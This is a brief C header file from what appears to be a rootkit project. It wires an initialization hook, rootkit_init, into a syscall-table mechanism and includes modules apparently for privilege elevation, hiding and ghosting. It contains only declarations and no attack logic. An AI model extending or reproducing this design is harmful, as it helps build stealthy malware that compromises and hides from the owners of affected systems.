#ifndef ROOTKIT_H
#define ROOTKIT_H

#include "elevate.h"
#include "ghost.h"
#include "hide.h"
#include "iface.h"
#include "sctm.h"

/* rootkit */

#define SCTM_INIT_POST_HOOK() rootkit_init()

/* initialization */
int rootkit_init(void);

#endif

